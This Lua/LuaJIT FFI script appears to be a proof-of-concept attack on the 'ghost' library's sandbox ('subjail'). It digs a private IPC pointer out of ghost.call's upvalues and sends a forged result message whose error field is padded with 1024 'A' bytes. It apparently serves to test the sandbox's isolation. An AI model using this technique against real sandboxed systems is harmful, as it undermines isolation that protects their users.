local ghost = require("ghost")
print("Attempting to hijack subjail")

local ffi = require("ffi")

ffi.cdef [[
    typedef int gh_ipcmsg_type;
    typedef uint32_t gh_result;

    static const gh_ipcmsg_type GH_IPCMSG_LUARESULT = 10;

    int fgetc(FILE *stream);

    __attribute__((aligned(8)))
    struct gh_ipcmsg_luaresult {
        gh_ipcmsg_type type;
        gh_result result;
        char error_msg[1024];
        int script_id;
    };

    typedef void gh_ipcmsg;

    gh_result gh_ipc_send(gh_ipc * ipc, gh_ipcmsg * msg, size_t msg_size);
]]

local ipc_ptr = nil
local ghost_call_debuginfo = debug.getinfo(ghost.call)
for i = 1, ghost_call_debuginfo.nups do
    local name, value = debug.getupvalue(ghost.call, i)
    if name == "IPC" then
        ipc_ptr = value
        break
    end
end

if ipc_ptr == nil then
    error("failed extracting IPC pointer")
end

print("gh_ipc pointer   ", ipc_ptr)

local fake_result = ffi.new("struct gh_ipcmsg_luaresult")
fake_result.type = ffi.C.GH_IPCMSG_LUARESULT;
fake_result.result = 0x000c0001 -- (GHR_ALLOC_ALLOCFAIL, ENOMEM)

ffi.fill(fake_result.error_msg, 1024, string.byte("A"))

fake_result.script_id = 0

print("fake luaresult message", fake_result)

local res = ffi.C.gh_ipc_send(ipc_ptr, fake_result, ffi.sizeof("struct gh_ipcmsg_luaresult"))
assert(res == 0)
